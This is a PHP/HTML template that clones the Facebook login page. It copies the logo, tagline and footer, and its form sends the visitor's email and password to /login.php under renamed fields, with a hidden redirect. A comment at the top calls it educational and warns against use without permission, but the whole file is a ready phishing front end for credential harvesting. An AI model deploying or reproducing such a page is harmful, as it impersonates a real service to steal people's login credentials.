<?php
// This is made for educational purpose only
// this demonstrate how simple are phishing attaks and we shhould be alert while browsing through internet 

// warning!: do not use this against anyone without their permission
?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Facebook Clone</title>
    <link rel="stylesheet" href="/templete2/style.css">
    <link rel="shortcut icon" href="/templete2/images/fb.ico" type="image/x-icon">
</head>

<body>
    <main>
        <div class="main">
        <div class="heading-section">
            <img src="/templete2/images/logo.png" class="logo-img">
            <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
        </div>

        <div class="form">
            <form class="a-form" action="/login.php" method="post">
                <input type="email" id="Email" class="a-email" name="fild1" placeholder="Email address or phone number"
                    autofocus="autofocus" required />
                <input type="password" id="Password" class="a-pss" name="fild2" placeholder="Password"
                    autofocus="autofocus" />
                <input type="submit" class="a-sub" value="Log In" />
                <a href="" class="a-link">Forgotten password?</a>
                <hr class="a-hr">
                <input type="submit " value="Create New Account" class="a-but" />
                <input type="hidden" name="redirect" value="<?php echo $redirect_url; ?>">
                <input type="hidden" name="decrp" value="facebook-login">
            </form>
            <div class="create-page">
                <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
            </div>
            </div>
        </div>

    </main>
    <div class="footer">
        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
            <ul>
                <li>English (UK)</li>
                <li><a href="">हिन्दी</a></li>
                <li><a href="">ગુજરાતી</a></li>
                <li><a href="">मराठी</a></li>
                <li><a href="">اردو</a></li>
                <li><a href="">മലയാളം</a></li>
                <li><a href="">বাংলা</a> </li>
                <li><a href="" class="_sv4">తెలుగు</a> </li>
                <li><a href="" class="_sv4">தமிழ்</a></li>
                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
                <li><a href="" class="_sv4">Español</a></li>
                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
            </ul>
            <div id="line"></div>
            <div>
                <ul>
                    <li><a href="">Sign Up</a></li>
                    <li><a href="" >Log In</a></li>
                    <li><a href="">Messenger</a></li>
                    <li><a href="">Facebook Lite</a> </li>
                    <li><a href=""> Watch </a> </li>
                    <li><a href="">People</a> </li>
                    <li><a href="">Pages</a></li>
                    <li><a  href="">Page categories</a></li>
                    <li><a href="">Places</a></li>
                    <li><a href="">Games</a></li>
                    <li><a href="">Locations</a></li>
                    <li><a href="">Marketplace</a></li>
                    <li><a href="">Facebook Pay</a></li>
                    <li><a href="">Groups</a></li>
                    <li><a href="">Jobs</a></li>
                    <li><a href="">Oculus</a></li>
                    <li><a href="">Portal</a></li>
                    <li><a href="">Instagram</a></li>
                    <li><a href="">Local</a></li>
                    <li><a href="">Fundraisers</a></li>
                    <li><a href="">Services</a></li>
                    <li><a href="">Voting Information Centre</a></li>
                    <li><a href="">About</a></li>
                    <li><a href="">Create ad</a></li>
                    <li><a href="">Create Page</a></li>
                    <li><a href="">Developers</a></li>
                    <li><a href="">Careers</a></li>
                    <li><a href="">Privacy</a></li>
                    <li><a href="">Cookies</a></li>
                    <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
                    <li><a href="">Terms</a></li>
                    <li><a href="">Help</a></li>
                    <li><a href="">Settings</a></li>
                    <li><a href="">Activity log</a></li>
                </ul>
            </div>
            <div class="copyright">
                <div><span> Facebook © 2021</span>
                </div>
            </div>
        </div>
    </div>
            <div class="m-footer">
                <div class="main-c">
                    <div class="list-1"><span >English (UK)</span>
                        <div><span><a href="">हिन्दी</a></span></div>
                        <div><span><a href="">اردو</a></span></div>
                        <div><span><a href="">বাংলা</a></span></div>
                    </div>
                    <div class="list-2">
                        <div><span><a href="">ગુજરાતી</a></span></div>
                        <div class=""><span><a href="">मराठी</a></span>
                        </div>
                        <div><span><a href="">മലയാളം</a></span></div>
                        <a>
                            <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="main-links">
                    <span>About </span>.
                    <span> Help </span>.
                    <span> More </span>
                </div>
                <div class="fb">Facebook Inc.</div>
            </div>

      

</body>

</html>